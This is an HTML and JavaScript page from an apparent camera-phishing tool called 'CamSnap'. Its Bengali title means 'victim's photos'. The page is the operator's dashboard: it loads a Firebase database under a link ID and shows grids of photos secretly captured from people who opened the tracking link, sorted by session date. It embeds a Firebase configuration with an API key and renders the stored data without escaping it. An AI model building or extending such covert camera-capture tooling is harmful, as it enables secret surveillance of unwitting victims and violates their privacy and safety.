<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ভিকটিমের ছবি • CamSnap</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    body{background:#111;color:#fff;font-family:'Segoe UI',sans-serif;padding:15px;min-height:100vh;}
    h1{text-align:center;color:#00ccff;font-size:2.2em;margin:25px 0;}
    .info{background:#222;padding:18px;border-radius:16px;margin:20px 0;text-align:center;font-size:1.1em;line-height:1.8;}
    .session{background:#1a1a2e;border-radius:20px;padding:22px;margin:28px 0;box-shadow:0 10px 30px rgba(0,0,0,0.5);}
    .date{color:#00ff9d;font-size:1.6em;font-weight:700;margin-bottom:10px;}
    .count{color:#aaa;margin-bottom:18px;font-size:1.15em;}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px;}
    .grid img{width:100%;height:220px;object-fit:cover;border-radius:16px;border:5px solid #0066ff;cursor:pointer;transition:0.3s;box-shadow:0 8px 25px rgba(0,102,255,0.5);}
    .grid img:hover{transform:scale(1.06);}
    .no-photos{color:#888;font-size:1.4em;text-align:center;padding:80px 0;}
    .back-btn{display:block;margin:40px auto;padding:15px 40px;background:#0066ff;color:#fff;border:none;border-radius:14px;font-size:1.3em;cursor:pointer;width:fit-content;}
  </style>
</head>
<body>
<div style="max-width:900px;margin:0 auto;">
  <h1>ভিকটিমের ছবি</h1>
  <div class="info" id="info">লোড হচ্ছে...</div>
  <div id="sessions"></div>
  <button class="back-btn" onclick="history.back()">ফিরে যাও</button>
</div>

<script>
// তোমার কনফিগ
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  storageBucket: "cam-snap-8e956.firebasestorage.app",
  messagingSenderId: "982089892260",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
  measurementId: "G-S5S37F55T6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ID নেওয়া (১০০% সঠিক)
let id = new URLSearchParams(location.search).get('id');
if (!id) id = location.pathname.split('/').pop();

if (!id || id === 'viewer.html') {
  document.body.innerHTML = "<h1 style='color:red;text-align:center;margin:100px 0;'>লিংক ভুল!</h1>";
}

// ছবি লোড করা
db.ref('links/' + id).on('value', (snapshot) => {
  const data = snapshot.val();
  const info = document.getElementById('info');
  const container = document.getElementById('sessions');

  if (!data) {
    info.innerHTML = "কোনো ডাটা পাওয়া যায়নি!";
    container.innerHTML = "";
    return;
  }

  info.innerHTML = `
    <strong>লিংক:</strong> ${data.url}<br>
    <strong>তৈরি:</strong> ${data.created}
  `;

  const sessions = data.sessions || {};
  if (Object.keys(sessions).length === 0) {
    container.innerHTML = "<p class='no-photos'>এখনো কোনো ছবি আসেনি</p>";
    return;
  }

  let html = '';
  Object.keys(sessions).sort((a,b) => b.localeCompare(a)).forEach(date => {
    const session = sessions[date];
    const photos = session.photos || [];

    html += `
      <div class="session">
        <div class="date">${date}</div>
        <div class="count">${photos.length} টি ছবি</div>
        <div class="grid">
          ${photos.map(src => `<img src="${src}" onclick="window.open('${src}')">`).join('')}
        </div>
      </div>
    `;
  });

  container.innerHTML = html;
});
</script>
</body>
</html>
